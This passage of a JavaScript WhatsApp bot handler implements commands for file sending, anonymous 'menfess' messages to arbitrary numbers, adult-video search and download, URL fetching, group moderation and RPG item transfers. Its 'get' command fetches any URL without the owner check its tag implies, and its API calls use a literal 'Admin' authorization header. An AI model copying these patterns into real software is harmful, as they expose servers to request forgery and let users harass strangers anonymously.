						delete conn.asahotak[m.chat];
					}, timeout)
				]
				break
			}
			case "sendfile": {
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!args[0]) {
					return
				}
				const fileName = args[0];
				if (!fs.existsSync(fileName)) {
					return m.reply("File not found")
				}
				await conn.sendMessage(
					m.chat,
					{
						document: await fs.readFileSync(fileName),
						mimetype: "application/zip",
						fileName,
					},
					{ quoted: m }
				);
				break
			}
			case "miaw": { // @tag: main
				if (!isAdmin && !isOwner) {
					return m.reply('Fitur ini khusus admin group dan owner bot');
				}
				if (!args[0]) {
					return m.reply(`Arguments.

Group/public:
1. on/off (?Admin)
2. clear (clear your conversation)

Owner:
1. disable/enable
2. erase (clear all conversation)
2. killall (disable all conversation)


Example: *${prefix + command}* on`)
				}
				if (args[0] === "on" || args[0] === "off") {
					if (m.isGroup) {
						if (!isAdmin) {
							return m.reply(mess.admin)
						}
						chat["miaw"] = args[0] === "off" ? false : true;
					} else {
						user["miaw"] = args[0] === "off" ? false : true;
					}
					m.reply(`Miaw AI Succesfully ${args[0] === "off" ? "disabled" : "enable"}d ${m.isGroup ? "in this group" : ""}`)
				}
				if (args[0] === "clear") {
					delete conn.openAiStoreData[m.sender]
					m.reply(`Succesfully clear your conversation with Miaw.`)
				}
				if (args[0] === "disable" || args[0] === "enable" && isOwner) {
					settings["openai"] = args[0] === "disable" ? false : true;
					m.reply(`Miaw AI Succesfully ${args[0]}d for all chats`)
				}
				if (args[0] === "erase" && isOwner) {
					let index = 0
					if (typeof conn.openAiStoreData !== "object") {
						return m.reply("empty stored database!")
					}
					Object.keys(conn.openAiStoreData).forEach((key) => {
						delete conn.openAiStoreData[key];
						index += 1
					})
					m.reply(`succesfully clearing ${index} conversation`)
				}
				if (args[0] == "killall" && isOwner) {
					let index = {
						_indexUsers: 0,
						_indexChats: 0
					}
					Object.keys(db.data.users).forEach((key) => {
						db.data.users[key].miaw = false;
						index._indexUsers += 1
					})
					Object.keys(db.data.chats).forEach((key) => {
						db.data.chats[key].miaw = false;
						index._indexChats += 1
					});
					m.reply(`Succesfully disabled.

private chats: ${index._indexUsers}
group chats: ${index._indexChats}
`)
				}
				break;
			}
			case "xnxx": { // @tag: 18+
			if (m.isGroup) {
					return m.reply('Private Only');
				}
				if (!isPremium) {
					return m.reply(mess.premium)
				}
				/*
				if (isLimit) {
					return m.reply(mess.limit)
				}
				*/
				if (!text) {
					return m.reply(`Example: *${prefix + command}* Mom`)
				}
				let json = null
				m.reply(mess.wait)
				if (/https:\/\/www.xnxx.com\//i.test(text)) {
					json = await (
						await fetch(
							API("rose", "/dewasa/xnxx/detail", { url: text }, "apikey")
						)
					).json();
					if (!json.status) {
						return m.reply(json.message || "request error")
					}
					const { low, high, hls } = json.result.download;
					try {
						const _filename = `./tmp/${Math.random().toString(36).substring(2, 7)}.mp4`;
						const writer = fs.createWriteStream(_filename);
						axios.get(high ? high : low, {
							responseType: "stream"
						}).then(async(data) => {
							return new Promise(async(resolve, reject) => {
								data.data.pipe(writer);
								writer.on("error", () => {
									m.reply("Failed sending video")
									resolve()
								})
								writer.on("close", async() => {
									try {
										await conn.sendMessage(m.chat, {
											video: {
												stream: fs.createReadStream(_filename)
											},
											caption: font(`*Title :* ${json.result.title}
*Duration :* ${json.result.duration}
*Views :* ${json.result.views}
*Rating :* ${json.result.rating}
*Like :* ${json.result.like}
*Dislike :* ${json.result.dislike}
*Quality :* ${json.result.quality}`, "a")
										},
											{ quoted: m }
										);
									} catch {
										await conn.sendMessage(m.chat, {
											document: {
												stream: fs.createReadStream(_filename)
											},
											fileName: font(`*Title :* ${json.result.title}
*Duration :* ${json.result.duration}
*Views :* ${json.result.views}
*Rating :* ${json.result.rating}
*Like :* ${json.result.like}
*Dislike :* ${json.result.dislike}
*Quality :* ${json.result.quality}`, "a")
										},
											{ quoted: m }
										);
									}
									fs.unlinkSync(_filename)
									// consumeLimit();
									resolve()
								})
							})
						})
					} catch {
						m.reply("Failed sending video")
					}
				} else {
					json = await (
						await fetch(
							API("rose", "/dewasa/xnxx/search", { query: text }, "apikey")
						)
					).json();
					if (!json.status) {
						return m.reply(json.message || "not found")
					}
					const listSection = [];
					json.result.forEach((v) => {
						listSection.push({
							title:  v.title,
							rowId: `${prefix + command} ${v.url}`,
							description: `${v.views} views | ${v.duration}`,
						});
					})
					const listMsg = {
						text: Config.footer,
						footer: `Hasil Pencarian ${text}`,
						buttonText: "Choose",
						sections: [
							{
								title: `Query: ${text}`,
								rows: listSection,
							},
						],
					};
					conn.sendMessage(m.chat, listMsg, { quoted: m } )
				}
				break
			}
			case "toimg": { // @tag: maker
				if (isLimit) {
					return m.reply(mess.limit);
				}
				if (!m.quoted) {
					return m.reply(`Quoted sticker nya`);
				}
				const q = m.quoted;
				const mime = (q.msg || q).mtype || q.type || "";
				if (!/sticker/i.test(mime)) {
					return m.reply(`itu bukan sticker.`);
				}
				const isAnimated = q.text ? q.text.isAnimated : false
				let sticker = await q.download?.()
				if (isAnimated) {
					return m.reply("Unsupported: animated sticker")
				} else {
					const buffers = []
					const [_spawn, ..._argsSpawn] = ["convert", "webp:-", "png:-"];
					const _Convert = spawn(_spawn, _argsSpawn);
					_Convert.on("error", (e) => {
						m.reply('Gagal convert :(')
					});
					_Convert.stdout.on("data", (chunk) => {
						buffers.push(chunk)
					});
					_Convert.stdin.write(sticker);
					_Convert.stdin.end();
					_Convert.on("exit", () => {
						const buffer = Buffer.concat(buffers)
						conn.sendMessage(m.chat, {
							image: buffer
						}, { quoted: m });
					});
				}
				consumeLimit()
				break;
			}
			case "balasmenfess": // { // @tag: tools }
			case "menfess": { // @tag: tools
				if (isLimit) {
					return m.reply(mess.limit)
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command === "balasmenfess" ? " code" : " 628xx"}*|pesan`)
				}
				conn.menfess = conn.menfess ? conn.menfess : {};
				let [number, ...messages] = text.split("|");

				const q = m.quoted ? m.quoted : m;
				const mime = (q.msg || q).mtype || q.type || "";
				let isMedia = false;
				if (/image|video/i.test(mime)) {
					isMedia = await q.download?.();
				}

				if (command === "balasmenfess") {
					if (!(number in conn.menfess)) {
						return m.reply(`Code ${number} tidak ada atau sudah tidak aktif`)
					}
					const code = number
					number = Object.values(conn.menfess[number]).filter(v => v !== m.sender)[0]
					const message = `Hai @${number.replace(/[^0-9]/g, "")} dia membalas pesan mu.

*Pesan*: ${ messages.join(" ") }`
					const bMenfesMsg = await conn.sendMessage(number, {
						...(isMedia ? { [/image/i.test(mime) ? "image" : /video/i.test(mime) ? "video" : "null"]: isMedia } : {}),
						...(isMedia ? { caption: message } : { text: message }),
						mentions: [number]
					})
					m.reply("berhasil membalas pesan.");

					await delay(2 * 1000);
					return await conn.sendMessage(number, {
						text: `${prefix}balasmenfess ${code}|balasan kamu`
					}, { quoted: bMenfesMsg });
				}
				if (number.startsWith("08")) {
					number = number.replace("08", "62");
				}
				number = number.replace(/[^0-9]/g, "");
				const [isOnWhatsApp] = await conn.onWhatsApp(number);
				if (!isOnWhatsApp || !isOnWhatsApp.exists) {
					return m.reply("nomor tersebut tidak terdaftar di whatsapp")
				}
				const codeMenfess = Crypto.randomBytes(Math.ceil(6/2)).toString("hex").slice(0, 6);

				conn.menfess[codeMenfess] = {
					sender: m.sender,
					to: number.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
				}
				const message = `Hai @${number} seseorang baru saja mengirim pesan ke nomor kamu.

*Pesan*: ${ messages.join(" ") }`

				const menfessMsg = await conn.sendMessage(number + "@s.whatsapp.net", {
					...(isMedia ? { [/image/i.test(mime) ? "image" : /video/i.test(mime) ? "video" : "null"]: isMedia } : {}),
					...(isMedia ? { caption: message } : { text: message }),
					mentions: [number + "@s.whatsapp.net"]
				})

				m.reply("Pesan berhasil dikirim")

				await delay(2 * 1000)
				await conn.sendMessage(number + "@s.whatsapp.net", {
					text: `${prefix}balasmenfess ${codeMenfess}|balasan kamu`
				}, { quoted: menfessMsg })
				await delay(2 * 1000);
				consumeLimit()
				break
			}
			// Create
			case "register": { // @tag: APIs
				const opts = {
					name: m.name,
					number: m.sender,
					apikey: Math.random().toString(36).substr(2, 14),
					limit: 100,
					premium: false
				}
				const { data } = await axios.request({
					baseURL: "https:/rest.miaw.my.id",
					url: "/admin/createUser",
					method: "POST",
					headers: {
						authorization: "Admin"
					},
					data: new URLSearchParams({ ...opts })
				}).catch((e) => e === null || e === void 0 ? void 0 : e.response)
				if (data.status) {
					let _text = "Berikut nfo akunmu\n\n"
					Object.keys(data.data).forEach((key) => {
						_text += `*_${key}_*: ${data.data[key]}\n`
					})
					if (m.isGroup) {
						m.reply("Registrasi berhasil.")
					}
					await conn.sendMessage(m.sender, {
						text: _text
					}, { quoted: m })
				} else {
					m.reply(data.message || "Mau ngapain.")
				}
				break
			}
			// Read
			case "akun": { // @tag: APIs
				const { data } = await axios.request({
					baseURL: "http://localhost:3000",
					url: "/admin/user/" + m.sender.replace(/[^0-9]/g, ""),
					method: "POST",
					headers: {
						authorization: "Admin"
					}
				}).catch((e) => e === null || e === void 0 ? void 0 : e.response)
				if (data.status) {
					let _text = "Info akunmu\n\n"
					Object.keys(data.data).forEach((key) => {
						_text += `*_${key}_*: ${data.data[key]}\n`
					})
					if (m.isGroup) {
						m.reply("Info akun telah dikirim di private chat.")
					}
					await conn.sendMessage(m.sender, {
						text: _text
					}, { quoted: m })
				}
				break
			}
			// Update
			case "get": { // @tag: owner
				if (!text || !text.startsWith("http")) {
					return m.reply(`Example: *${prefix + command}* https://google.com`)
				}
				const { data, headers } = await axios.get(args[0]).catch((e) => e === null || e === void 0 ? void 0 : e.response);
				if (data && headers && headers["content-type"]) {
					const type = headers["content-type"].includes("image") ? "image" : headers["content-type"].includes("video") ? "image" : "text";
					let _data = data;
					try {
						_data = JSON.stringify(data)
					} catch {}
					await conn.sendMessage(m.chat, {
						...( /video|image/i.test(type) ? { [type]: { url: args[0] }, caption: args[0] } : { [type]: String(_data) } ),
					}, { quoted: m })
				} else {
					m.reply("failed")
				}
				break
			}
			case "backuplist": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				let _listResponse = {}
				Object.keys(db.data.chats).forEach((key) => {
					if (Object.keys(db.data.chats[key].listResponse).length > 1) {
						Object.assign(_listResponse, {
							[key]: db.data.chats[key]
						})
					}
				});
				const _filename = `./backup_ListResponse_${Date.now()}.json`;
				if (!fs.existsSync(_filename)) {
					fs.writeFileSync(_filename, JSON.stringify(_listResponse))
				}
				conn.sendMessage(m.chat, {
					text: "filename: " + _filename
				}, { quoted: m })
				break
			}
			case "restorelist": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* File_name.ext`)
				}
				if (!fs.existsSync(text)) {
					return m.reply("File not found")
				}
				const jasonBourne = JSON.parse(fs.readFileSync(text, "utf-8"));
				Object.keys(jasonBourne).forEach((key) => {
					if (db.data.chats[key]) {
						Object.assign(db.data.chats[key], {
							...jasonBourne[key]
						})
					}
				});
				m.reply("Succesfully restore list message");
				break
			}
			case "confess": { // @tag: tools
				m.reply("confess pala kau")
				break;
			}
			case "kick": { // @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group)
				}
				if (!isAdmin || !isBotAdmin) {
					return m.reply(!isAdmin ? mess.admin : mess.botAdmin)
				}
				const who = Array.isArray(m.mentions) && m.mentions.length ? m.mentions : m.quoted && m.quoted.sender ? [m.quoted.sender] : false;
				if (!who) {
					return m.reply(`Example: *${prefix + command}* @tag`)
				}
				const kick = await conn.groupParticipantsUpdate(
					m.chat,
					who,
					"remove"
				).catch(() => false)
				if (!kick || Array.isArray(kick) && kick.length && kick[0].status !== "200") {

					return m.reply("gagal ngekick :D")
				}
				await delay(3 * 1000);
				await conn.sendMessage(m.chat, {
					text: `Success kick ${who.map((v) => "@" + v.replace(/[^0-9]/g, "")).join(", ")}`,
					mentions: who
				}, { quoted: m })
				break
			}
			case "add": { // @tag: admin
				if (!m.isGroup) {
					return m.reply(mess.group)
				}
				if (!isAdmin || !isBotAdmin) {
					return m.reply(!isAdmin ? mess.admin : mess.botAdmin)
				}
				if (!text) {
					return m.reply(`Example: *${prefix + command}* 628xx`)
				}
				const number = text.replace(/[^0-9]/g, "");
				const add = await conn.groupParticipantsUpdate(
					m.chat,
					[number],
					"add"
				)
				if (!add || Array.isArray(add) && add.length && add[0].status !== "200") {

					return m.reply("gagal add :D")
				}
				break
			}
			case "group": {
				if (!m.isGroup) {
					return m.reply(mess.group)
				}
				if (!isAdmin || !isBotAdmin) {
					return m.reply(!isAdmin ? mess.admin : mess.botAdmin)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* open/close`)
				}
				if (args[0].toLowerCase() === "close") {
					await conn.groupSettingUpdate(
						m.chat,
						"announcement"
					)
				}
				if (args[0].toLowerCase() === "open") {
					await conn.groupSettingUpdate(
						m.chat,
						"not_announcement"
					)
				}
				/close|open/i.test(args[0]) ? m.reply(`Group sekarang di ${args[0]}`) : false
				break
			}
			case "gconly": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`)
				}
				if (args[0] === "on" || args[0] === "off") {
					settings["gcOnly"] = args[0] === "on" ? true : false;
					settings["pcOnly"] = false;
					m.reply(`group chat only ${args[0] === "on" ? "active" : "inactive"}`)
				}
				break
			}
			case "pconly": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner)
				}
				if (!args[0]) {
					return m.reply(`Example: *${prefix + command}* on/off`)
				}
				if (args[0] === "on" || args[0] === "off") {
					settings["pcOnly"] = args[0] === "on" ? true : false;
					settings["gcOnly"] = false;
					m.reply(`private chat only ${args[0] === "on" ? "active" : "inactive"}`)
				}
				break
			}
			case "reducelimit": // { @tag: owner }
			case "reducemoney": // { @tag: owner }
			case "addmoney": // { @tag: owner }
			case "addlimit": { // @tag: owner
				if (!isOwner) {
					return m.reply(mess.owner);
				}
				if (!args[0] || !args[1]) {
					return m.reply(`Example: *${prefix + command}* nomor angka`)
				}
				const isOnDatabase = db.data.users[args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"];
				if (!isOnDatabase) {
					return m.reply("Nomor tidak terdaftar di database")
				}
				const number = !isNaN(Number(args[1].replace(/[^0-9]/g, ""))) ? Number(args[1].replace(/[^0-9]/g, "")) : false;
				if (!number) {
					return m.reply("Jumlah hanya angka")
				}
				if (command === "reducelimit") {
					if (isOnDatabase["limit"]["value"] - number < 0) {
						isOnDatabase["limit"]["value"] = 0
					} else {
						isOnDatabase["limit"]["value"] -= number;
					}
					m.reply(`Success reduce ${args[1]} user limit`)
				}
				if (command === "addlimit") {
					isOnDatabase["limit"]["value"] += number;
					m.reply(`Success add ${args[1]} limit to user`)
				}
				if (command === "addmoney") {
					isOnDatabase["money"] += number;
					m.reply(`Success add ${args[1]} money to user`)
				}
				if (command === "reducemoney") {
					if (isOnDatabase["money"] - number < 0) {
						isOnDatabase["money"] = 0
					} else {
						isOnDatabase["money"] -= number;
					}
					m.reply(`Success reduce ${args[1]} user money`)
				}
				break
			}
			case "tf": { // @tag: rpg
				if (!settings.rpg["enable"]) {
					return m.reply(mess.rpgDisabled);
				}
				if (!isUserRpg) {
					return m.reply(mess.notInRpg);
				}
				const who = Array.isArray(m.mentions) && m.mentions.length ? m.mentions[0] : args[0];

				let _userProps = `*Money 💵* : Rp. ${Number(user.money).toLocaleString("id")}
*Potion 💊*: ${rpg.potion.value}

╭━━━「 *YOUR ITEM*
`;
					Object.keys(rpg).forEach((key) => {
						if (typeof rpg[key] === "object" && key !== "potion") {
							Object.keys(rpg[key]).forEach((prop) => {
								if (rpg[key][prop].value >= 1) {
									_userProps += `┊ > *${prop}*: ${rpg[key][prop].value}\n`;
								}
							});
						}
					});
				_userProps = _userProps.trim() + "\n╰═┅═━"
				if (!who) {
					return m.reply(_userProps + `\nExample: *${prefix + command}* @tag/nomor nama_item Jumlah`)
				}
				if (user["money"] < 1000) {
					return m.reply("duitmu gak cukup buat bayar biaya admin fee\n\nAdmin Fee: rp. 1000")
				}
				let targetTF = db.data.users[who.replace(/[^0-9]/g, "") + "@s.whatsapp.net"];
				if (!targetTF || !targetTF["rpg"]) {
					return m.reply(!targetTF ? "Nomor tidak terdaftar" : "belum join rpg")
				}
				const input = args[1].toLowerCase();
				const value = !isNaN(Number(args[2].replace(/[^0-9]/g, ""))) ? Number(args[2].replace(/[^0-9]/g, "")) : false;
				if (!value || typeof value !== "number") {
					return m.reply("Jumlah hanya angka!");
				}
				// declare variable modify data user.
				let modifyData = false;

				if (typeof rpg[input] === "object" && rpg[input]) {
					modifyData = rpg[input];
					targetTF = targetTF["rpg_data"][input]
				} else if (
					typeof rpg.hunting[input] === "object" &&
					rpg.hunting[input]
				) {
					modifyData = rpg.hunting[input];
					targetTF = targetTF["rpg_data"].hunting[input]
				} else if (
					typeof rpg.fishing[input] === "object" &&
					rpg.fishing[input]
				) {
					modifyData = rpg.fishing[input];
					targetTF = targetTF["rpg_data"].fishing[input]
				} else if  (
					typeof rpg.mining[input] === "object" &&
					rpg.mining[input]
				) {
					modifyData = rpg.mining[input];
					targetTF = targetTF["rpg_data"].mining[input]
				}
				if (!modifyData) {
					return m.reply(`${args[1]} tidak tersedia.`)
				}
				if (modifyData["value"] < value) {
					return m.reply("Jumlah tidak cukup untuk ditransfer")
				}
				targetTF["value"] += value;
				modifyData["value"] -= value;
				user["money"] -= 1000;
				conn.sendMessage(m.chat, {
					text: font(`Transfer ke @${who.replace(/[^0-9]/g, "")} berhasil

*Item*: ${args[1]}
*Jumlah TF*: ${value}
*Sisa ${args[1]}*: ${modifyData.value}
*Admin Fee*: Rp. 1000`, "a"),
					mentions: [who]
				}, { quoted: m })
				break
			}
		}
	} catch (e) {
		console.log(e);
	}
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(chalk.green("[UPDATED]", chalk.white(__filename)));
	delete require.cache[file];
	require(file);
});
